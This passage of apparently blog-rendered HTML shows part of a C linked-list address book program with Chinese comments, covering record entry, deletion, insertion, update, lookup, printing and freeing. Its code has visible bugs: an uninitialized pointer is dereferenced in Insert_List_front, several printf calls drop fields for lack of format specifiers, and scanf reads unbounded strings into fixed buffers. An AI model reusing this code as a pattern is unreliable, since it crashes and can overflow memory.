class="params">()</span></span>&#123;</span><br><span class="line">    List *node,*tail;</span><br><span class="line">    tail = L;</span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> flag = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(flag)&#123;</span><br><span class="line">        count++;</span><br><span class="line">        node = (List*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(List));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;录入第%d条记录：\n&quot;</span>,count);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ID（编号）：&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;(node-&gt;data.ID));</span><br><span class="line">        <span class="comment">//判断 ID 是否重复</span></span><br><span class="line">        List *p = L-&gt;next;  <span class="comment">//由于是前插，则将 当前插入的 ID 与 链表中后一位进行比较</span></span><br><span class="line">        <span class="keyword">while</span>(p)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">strcmp</span>(p-&gt;data.ID,node-&gt;data.ID) == <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;ID重复，请重新进行输入！\n&quot;</span>);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;ID（编号）：&quot;</span>);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;(node-&gt;data.ID));</span><br><span class="line">            &#125;<span class="keyword">else</span></span><br><span class="line">                p = p-&gt;next;   <span class="comment">//遍历所有元素进行比较</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;姓名：&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,(node-&gt;data.name));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;性别（女：F  男：M）：&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,(node-&gt;data.sex));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;电话（11位）：&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,(node-&gt;data.tele));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;住址：&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,(node-&gt;data.add));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;分组（朋友、家人、同学等）：&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,(node-&gt;data.group));</span><br><span class="line">        <span class="comment">//尾插</span></span><br><span class="line">        tail-&gt;next = node;</span><br><span class="line">        node-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">        tail = node;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;是否继续录入？（1.继续 0.完成录入）&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;flag);</span><br><span class="line">        <span class="keyword">if</span>(flag == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//四、删除记录</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Dele_List</span><span class="params">()</span></span>&#123;</span><br><span class="line">    List *p = L-&gt;next;</span><br><span class="line">    List *q = L;  		<span class="comment">//使 q 始终指向 p 的前一个结点</span></span><br><span class="line">    <span class="keyword">char</span> ID[<span class="number">15</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入需要删除的ID：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;ID);</span><br><span class="line">    <span class="keyword">while</span>(p &amp;&amp; <span class="built_in">strcmp</span>(p-&gt;data.ID,ID) != <span class="number">0</span>)&#123;  <span class="comment">//查找 需要删除的节点位置 p</span></span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">        q = q-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(p)&#123;</span><br><span class="line">        q-&gt;next = p-&gt;next;			<span class="comment">//删除 p 所指结点</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;删除成功！\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;您所删除的信息是：\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ID（编号）：&quot;</span>,p-&gt;data.ID);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;姓名：&quot;</span>,p-&gt;data.name);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;性别（女：F  男：M）：&quot;</span>,p-&gt;data.sex);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;电话：&quot;</span>,p-&gt;data.tele);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;住址：&quot;</span>,p-&gt;data.add);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;分组：&quot;</span>,p-&gt;data.group);</span><br><span class="line">        <span class="built_in">free</span>(p);				<span class="comment">//释放空间</span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;通讯录中不存在此人信息！\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//五、插入记录（前插法）</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Insert_List_front</span><span class="params">()</span></span>&#123;</span><br><span class="line">    List *p,*q,*r,*node;</span><br><span class="line">    p = p-&gt;next;</span><br><span class="line">    q = L;</span><br><span class="line">    <span class="keyword">char</span> ID[<span class="number">15</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入需要插入的记录 ID：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;ID);</span><br><span class="line">    <span class="keyword">while</span>(p &amp;&amp; <span class="built_in">strcmp</span>(p-&gt;data.ID,ID) != <span class="number">0</span>)&#123;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">        q = q-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(p != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        node = (List*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(List));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;请输入结点信息：\n&quot;</span>);</span><br><span class="line">	judge:</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;ID：&quot;</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;(node-&gt;data.ID));</span><br><span class="line">		<span class="comment">//判断 ID 是否重复</span></span><br><span class="line">		r = L-&gt;next;</span><br><span class="line">		<span class="keyword">while</span>(r &amp;&amp; <span class="built_in">strcmp</span>(r-&gt;data.ID,node-&gt;data.ID) != <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			r = r-&gt;next;</span><br><span class="line">		&#125;</span><br><span class="line">        <span class="keyword">if</span>(r != <span class="literal">NULL</span>) <span class="comment">//ID 重复</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;ID重复，请重新输入！\n&quot;</span>);</span><br><span class="line">			<span class="keyword">goto</span> judge;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;姓名：&quot;</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;(node-&gt;data.name));</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;性别：&quot;</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;(node-&gt;data.sex));</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;电话：&quot;</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;(node-&gt;data.tele));</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;住址：&quot;</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;(node-&gt;data.add));</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;分组：&quot;</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;(node-&gt;data.group));</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//如果没有该ID</span></span><br><span class="line">		<span class="keyword">int</span> select1;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;通讯录中未找到该ID,是否使用默认方式将新节点插入到最后(1.是 0.否)：&quot;</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;select1);</span><br><span class="line">		<span class="keyword">if</span> (select1 == <span class="number">1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">//给新节点分配空间</span></span><br><span class="line">			node = (List *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(List));</span><br><span class="line">			<span class="comment">//给新节点输入数据</span></span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;请输入新节点信息：\n&quot;</span>);</span><br><span class="line">		judge1:</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;ID：&quot;</span>);</span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;(node-&gt;data.ID));</span><br><span class="line">			<span class="comment">//判断ID是否重复</span></span><br><span class="line">			r = L-&gt;next;</span><br><span class="line">			<span class="keyword">while</span> (r &amp;&amp; <span class="built_in">strcmp</span>(r-&gt;data.ID, node-&gt;data.ID) != <span class="number">0</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				r = r-&gt;next;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (r != <span class="literal">NULL</span>) <span class="comment">//ID重复</span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;ID重复,请重新输入!\n&quot;</span>);</span><br><span class="line">				<span class="keyword">goto</span> judge1;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;姓名：&quot;</span>);</span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;(node-&gt;data.name));</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;性别：&quot;</span>);</span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;(node-&gt;data.sex));</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;电话：&quot;</span>);</span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;(node-&gt;data.tele));</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;住址：&quot;</span>);</span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;(node-&gt;data.add));</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;分组：&quot;</span>);</span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;(node-&gt;data.group));</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	node-&gt;next = q-&gt;next;</span><br><span class="line">	q-&gt;next = node;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;插入成功！\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//六、插入记录（尾插法）</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Insert_List_behind</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	List *p, *r, *q, *node;</span><br><span class="line">	p = L-&gt;next;</span><br><span class="line">	q = L;</span><br><span class="line">	<span class="keyword">char</span> ID[<span class="number">15</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请输入要插入的位置(输入该位置的ID)：&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;ID);</span><br><span class="line">	<span class="keyword">while</span> (p &amp;&amp; <span class="built_in">strcmp</span>(p-&gt;data.ID,ID) != <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		p = p-&gt;next;</span><br><span class="line">		q = q-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//为新节点分配空间</span></span><br><span class="line">		node = (List*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(List));</span><br><span class="line">		<span class="comment">//为新节点输入数据</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;请输入新节点信息：\n&quot;</span>);</span><br><span class="line">	judge:</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;ID：&quot;</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;(node-&gt;data.ID));</span><br><span class="line">		<span class="comment">//判断ID是否重复</span></span><br><span class="line">		r = L-&gt;next;</span><br><span class="line">		<span class="keyword">while</span> (r &amp;&amp; <span class="built_in">strcmp</span>(r-&gt;data.ID, node-&gt;data.ID) != <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			r = r-&gt;next;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (r != <span class="literal">NULL</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;ID重复，请重新输入！\n&quot;</span>);</span><br><span class="line">			<span class="keyword">goto</span> judge;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;姓名：&quot;</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;(node-&gt;data.name));</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;性别：&quot;</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;(node-&gt;data.sex));</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;电话：&quot;</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;(node-&gt;data.tele));</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;住址：&quot;</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;(node-&gt;data.add));</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;分组：&quot;</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;(node-&gt;data.group));</span><br><span class="line">		node-&gt;next = p-&gt;next;</span><br><span class="line">		p-&gt;next = node;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;插入成功！\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//通讯录中未找到该ID</span></span><br><span class="line">		<span class="keyword">int</span> select2;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;通讯录中未找到该ID,是否使用默认方式将该节点插入到最后(1.是 0.否)：&quot;</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;select2);</span><br><span class="line">		<span class="keyword">if</span> (select2 == <span class="number">1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">//为新节点分配空间</span></span><br><span class="line">			node = (List *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(List));</span><br><span class="line">			<span class="comment">//为新节点录入信息</span></span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;请输入新节点信息：\n&quot;</span>);</span><br><span class="line">		judge1:</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;ID：&quot;</span>);</span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;(node-&gt;data.ID));</span><br><span class="line">			<span class="comment">//判断ID是否重复</span></span><br><span class="line">			r = L-&gt;next;</span><br><span class="line">			<span class="keyword">while</span> (r &amp;&amp; <span class="built_in">strcmp</span>(r-&gt;data.ID, node-&gt;data.ID) != <span class="number">0</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				r = r-&gt;next;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (r != <span class="literal">NULL</span>) <span class="comment">//ID重复</span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;ID重复，请重新输入！\n&quot;</span>);</span><br><span class="line">				<span class="keyword">goto</span> judge1;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;姓名：&quot;</span>);</span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;(node-&gt;data.name));</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;性别：&quot;</span>);</span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;(node-&gt;data.sex));</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;电话：&quot;</span>);</span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;(node-&gt;data.tele));</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;住址：&quot;</span>);</span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;(node-&gt;data.add));</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;分组：&quot;</span>);</span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;(node-&gt;data.group));</span><br><span class="line">			node-&gt;next = q-&gt;next;</span><br><span class="line">			q-&gt;next = node;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (select2 == <span class="number">0</span>)</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">	&#125;	</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//七、修改通讯录记录</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Update_List</span><span class="params">()</span></span>&#123;</span><br><span class="line">    List *p;</span><br><span class="line">    p = L-&gt;next;</span><br><span class="line">    <span class="keyword">char</span> ID[<span class="number">15</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入需要修改的ID：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;ID);</span><br><span class="line">    <span class="keyword">while</span>(p &amp;&amp; <span class="built_in">strcmp</span>(p-&gt;data.ID,ID) != <span class="number">0</span>)&#123;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(p != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">int</span> select;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;请输入需要修改的属性：（1.姓名 2.性别 3.电话 4.住址 5.分组）：&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;select);</span><br><span class="line">        <span class="keyword">if</span>(select == <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;请输入新的姓名：&quot;</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;(p-&gt;data.name));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(select == <span class="number">2</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;请输入新的性别：&quot;</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;(p-&gt;data.sex));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(select == <span class="number">3</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;请输入新的电话：&quot;</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;(p-&gt;data.tele));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(select == <span class="number">4</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;请输入新的住址：&quot;</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;(p-&gt;data.add));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(select == <span class="number">5</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;请输入新的分组：&quot;</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;(p-&gt;data.group));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;更新成功！\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;通讯录中不存在该 ID！\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//八、查找记录（根据ID）</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Find_List</span><span class="params">()</span></span>&#123;</span><br><span class="line">    List *p;</span><br><span class="line">    <span class="keyword">char</span> ID[<span class="number">15</span>];</span><br><span class="line">    p = L-&gt;next;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入需要查找的ID：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;ID);</span><br><span class="line">    <span class="keyword">while</span>(p &amp;&amp; <span class="built_in">strcmp</span>(p-&gt;data.ID,ID) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(p == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;通讯录中不存在此人！\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ID（编号）：%s\t&quot;</span>,p-&gt;data.ID);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;姓名：&quot;</span>,p-&gt;data.name);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;性别（女：F  男：M）：%s\t&quot;</span>,p-&gt;data.sex);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;电话（11位）：%s\t&quot;</span>,p-&gt;data.tele);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;住址：%s\t&quot;</span>,p-&gt;data.add);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;分组（朋友、家人、同学等）：%s\t&quot;</span>,p-&gt;data.group);    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//九、打印输出所有记录  遍历</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Printall_List</span><span class="params">()</span></span>&#123;</span><br><span class="line">    List *p;</span><br><span class="line">    <span class="keyword">if</span>(L == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;通讯录是空的！\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        p = L-&gt;next;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;通讯录中的全部记录如下：\n&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>(p)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;ID（编号）：%s\t&quot;</span>,p-&gt;data.ID);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;姓名：&quot;</span>,p-&gt;data.name);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;性别（女：F  男：M）：%s\t&quot;</span>,p-&gt;data.sex);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;电话（11位）：%s\t&quot;</span>,p-&gt;data.tele);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;住址：%s\t&quot;</span>,p-&gt;data.add);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;分组（朋友、家人、同学等）：%s\t&quot;</span>,p-&gt;data.group);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            p = p-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//十、释放 链表</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Destroy_List</span><span class="params">()</span></span>&#123;</span><br><span class="line">    List *p,*q;</span><br><span class="line">    p = L-&gt;next;</span><br><span class="line">    <span class="keyword">while</span>(p)</span><br><span class="line">    &#123;</span><br><span class="line">        q = p;			<span class="comment">//使用 q 暂时存放当前结点</span></span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">        <span class="built_in">free</span>(q);</span><br><span class="line">        q = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line">    <span class="built_in">free</span>(L);</span><br><span class="line">    L = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;释放成功！\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//菜单界面</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Menu</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\t\t\t*********************简易通讯录*******************\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\t\t\t1.初始化通讯录                          5.查找联系人\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\t\t\t2.创建通讯录                      	6.插入联系人\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\t\t\t3.删除联系人                      	7.遍历通讯录\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\t\t\t4.修改联系人                      	8.释放通讯录\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\t\t\t********************* 0 为退出 *******************\n&quot;</span>);</span><br><span class="line">&#125;  </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> select;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;使用说明：为了您的正常使用，请按照顺序进行操作！！！\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;首先请初始化；随后请创建通讯录！！！之后可进行 删除、修改、查找、插入、遍历等操作；最后请释放通讯录！！\n&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">		<span class="comment">//system(&quot;cls&quot;);</span></span><br><span class="line">        Menu();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;请选择菜单：&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;select);</span><br><span class="line">        <span class="keyword">switch</span>(select)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                &#123;</span><br><span class="line">					<span class="comment">//初始化</span></span><br><span class="line">                    Init_List();</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                &#123;</span><br><span class="line">					<span class="comment">//创建通讯录</span></span><br><span class="line">                    <span class="keyword">int</span> num;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;请选择创建方式(1.前插法 2.尾插法)：&quot;</span>);</span><br><span class="line">                    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;num);</span><br><span class="line">                    <span class="keyword">if</span>(num == <span class="number">1</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="comment">//前插法</span></span><br><span class="line">                        Creat_List_front();</span><br><span class="line">                        <span 